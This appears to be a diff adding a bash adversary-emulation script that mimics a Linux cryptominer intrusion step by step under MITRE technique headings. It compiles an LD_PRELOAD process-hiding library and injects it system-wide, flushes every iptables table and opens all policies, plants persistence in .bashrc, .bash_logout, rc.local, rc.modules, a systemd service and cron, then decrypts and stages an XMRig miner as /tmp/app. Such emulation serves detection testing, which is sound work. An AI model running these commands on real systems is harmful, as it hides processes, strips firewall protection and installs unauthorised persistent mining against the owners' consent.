@@ -1,0 +1,175 @@
+#!/bin/bash
+
+
+
+################ Defence Evasion (Compile panda_h14) ################
+
+
+/usr/bin/gcc -c -fPIC /dev/shm/hideproc.c -o /dev/shm/hideproc.o
+sleep 1
+/usr/bin/gcc /dev/shm/hideproc.o -shared -o /dev/shm/hideproc.so
+sleep 1
+echo "LD_PRELOAD=/dev/shm/hideproc.so" >> /etc/environment
+echo "export LD_PRELOAD=/dev/shm/hideproc.so" >> /etc/profile
+echo "source /etc/profile; source /etc/environment" >> /home/angtingfeng/.bashrc
+
+echo "113" >> /dev/shm/.hiddenpid
+
+
+################ Defence Evasion (MITRE T1562.004 - Disable or Modify System Firewall) ################
+
+##Process 1
+
+iptables-save > /tmp/iptables_backup.rules
+# Backs up the current iptables configuration so the system can be restored after the simulation.
+
+sleep 1
+
+##Process 2
+
+/usr/sbin/iptables -P INPUT ACCEPT
+# Sets the INPUT policy to ACCEPT, allowing all incoming traffic.
+
+sleep 1
+
+##Process 3
+
+/usr/sbin/iptables -P FORWARD ACCEPT
+# Sets the FORWARD policy to ACCEPT, allowing all forwarded packets.
+
+sleep 1
+
+##Process 4
+
+/usr/sbin/iptables -P OUTPUT ACCEPT
+# Sets the OUTPUT policy to ACCEPT, allowing all outbound traffic.
+
+sleep 1
+
+##Process 5
+
+for t in filter nat mangle raw security; do \
+    /usr/sbin/iptables -t "$t" -F; /usr/sbin/iptables -t "$t" -X; /usr/sbin/iptables -t "$t" -Z;  \
+done 
+# Flushes, deletes, and zeroes all rules and counters across the main iptables tables (filter, nat, mangle, raw, security), effectively leaving the system with no firewall restrictions.
+
+sleep 1
+
+##Process 6
+
+/usr/sbin/iptables -L
+
+
+################ Persistence (.bashrc and .bash_logout) ################
+ 
+echo "echo 'Testing for bashrc persistence'" > /tmp/.bashrc.koske
+
+echo "if [ -e /tmp/.bashrc.koske ]; then
+    bash /tmp/.bashrc.koske 
+fi
+" >> /home/angtingfeng/.bashrc
+
+echo "if [ -e /tmp/.bashrc.koske ]; then
+    bash /tmp/.bashrc.koske 
+fi
+" >> /home/angtingfeng/.bash_logout
+
+################ Persistence (rc.local) ################
+
+
+#Process 1
+sudo /usr/bin/dd if=/dev/urandom of=/tmp/intel_audio.ko bs=1024 count=10
+# Creates a benign kernel object file (intel_audio.ko) using random data to safely mimic adversary tradecraft.
+# if (input), of (output), bs (block size), count (no of block)
+
+sleep 1
+
+#Process 2
+[ -f /etc/rc.local ] && echo "insmod /tmp/intel_audio.ko" >> /etc/rc.local || { echo "insmod /tmp/intel_audio.ko" >> /etc/rc.local; chmod +x /etc/rc.local; }
+# Appends an insmod command to /etc/rc.local, creating and marking it executable if the file does not exist.
+
+sleep 1
+
+#Process 3
+[ -f /etc/rc.modules ] && echo "/sbin/insmod /tmp/intel_audio.ko" >> /etc/rc.modules || { echo "/sbin/insmod /tmp/intel_audio.ko" >> /etc/rc.modules; chmod +x /etc/rc.modules; }
+# Appends or creates an entry in /etc/rc.modules to ensure the kernel module loads via /sbin/insmod.
+
+sleep 1
+
+#Process 4
+cat /etc/rc.local /etc/rc.modules
+# Displays the modified startup files to confirm that the insmod entries have been successfully inserted.
+
+sleep 1
+
+################ Persistence (Systemd Service) ################
+
+echo "[Unit]
+Description=My Custom-Test Script Service
+After=network.target
+
+[Service]
+Type=simple
+ExecStart=/home/angtingfeng/Desktop/polygot_downloader.sh
+Restart=always
+
+[Install]
+WantedBy=multi-user.target" > /etc/systemd/system/koske.service
+
+/usr/bin/systemctl enable koske.service
+
+sleep 1
+
+/usr/bin/systemctl start koske.service
+
+sleep 1
+
+/usr/bin/systemctl status koske.service
+
+sleep 1
+
+################ Persistence (MITRE T1053.003 - Cron) ################ 
+
+echo "*/5 * * * * echo 'This could be really dangerous to run' > /dev/pts/0" | /usr/bin/crontab -
+
+
+################ Command n Control (MITRE T1090.001 - Internal Proxy) ################ 
+
+
+cat /home/angtingfeng/.bashrc | grep proxy 
+
+sleep 1
+
+cat /etc/environment | grep proxy
+
+sleep 1
+
+cat /home/angtingfeng/.profile | grep proxy
+
+sleep 1
+
+################ Impact (MITRE TA0040.003) ################ 
+
+
+#Process 1
+
+/usr/bin/openssl enc -d -aes-256-cbc -pbkdf2 \
+-in /home/angtingfeng/Downloads/xmrig-6.25.0/xmrig_openssl_encrypted.zip.enc \
+-out /tmp/xmrig_openssl_encrypted.zip \
+-pass pass:picuspicus
+
+sleep 1
+
+#Process 2
+
+/usr/bin/unzip /tmp/xmrig_openssl_encrypted.zip -d /tmp
+
+sleep 1
+
+/usr/bin/mv /tmp/xmrig /tmp/app
+
+sleep 1
+
+/usr/bin/chmod +x /tmp/app
+
+
